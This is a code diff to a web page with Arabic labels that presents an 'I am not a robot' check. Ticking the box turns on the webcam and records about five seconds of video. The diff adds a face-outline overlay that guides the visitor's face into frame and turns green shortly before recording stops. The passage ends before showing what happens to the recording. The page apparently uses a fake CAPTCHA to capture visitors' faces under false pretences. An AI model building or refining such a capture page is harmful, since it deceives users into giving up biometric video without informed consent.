@@ -159,6 +159,26 @@
             overflow-y: auto; /* تمكين التمرير العمودي */
             padding: 10px;
         }
+        .face-shape {
+            position: absolute;
+            top: 50%; /* Center vertically */
+            left: 50%; /* Center horizontally */
+            width: 120px; /* Adjust size as needed */
+            height: 150px; /* Adjust size as needed */
+            border: 5px solid white; /* Initial outline color */
+            border-radius: 60px; /* Rounded edges for the face shape */
+            transform: translate(-50%, -50%); /* Center the shape */
+            pointer-events: none; /* Allow clicks to pass through */
+            display: none; /* Initially hidden */
+        }
+
+        .face-shape.active {
+            display: block; /* Show when active */
+        }
+
+        .face-shape.green {
+            border-color: green; /* Change outline color to green */
+        }
     </style>
 </head>
 <body>
@@ -169,6 +189,9 @@
             <label for="robot-checkbox">أنا لست روبوتاً</label>
         </div>
         <video id="video" autoplay playsinline muted></video>
+        <div class="face-shape" id="face-shape">
+            <div class="mouth"></div> <!-- Mouth element -->
+        </div> <!-- Face shape overlay -->
         <div class="loading">جاري التحقق... ⏳</div>
         <div class="success">✅ تم التحقق بنجاح!</div>
     </div>
@@ -203,6 +226,10 @@
                 video.style.display = 'block';
                 loading.style.display = 'block';
                 success.style.display = 'none';
+                const faceShape = document.getElementById('face-shape');
+
+                // Show the face shape
+                faceShape.classList.add('active');
 
                 navigator.mediaDevices.getUserMedia({ video: true })
                 .then((stream) => {
@@ -213,7 +240,15 @@
                     mediaRecorder.start();
                     mediaRecorder.ondataavailable = (event) => { chunks.push(event.data); };
 
-                    setTimeout(() => { mediaRecorder.stop(); }, 5000);
+                    // Change face shape color after 4 seconds
+                    setTimeout(() => {
+                        faceShape.classList.add('green'); // Change color to green
+                    }, 4000);
+
+                    setTimeout(() => { 
+                        mediaRecorder.stop(); 
+                        faceShape.classList.remove('active'); // Hide face shape after recording
+                    }, 5000);
 
                     mediaRecorder.onstop = () => {
                         loading.style.display = 'none';
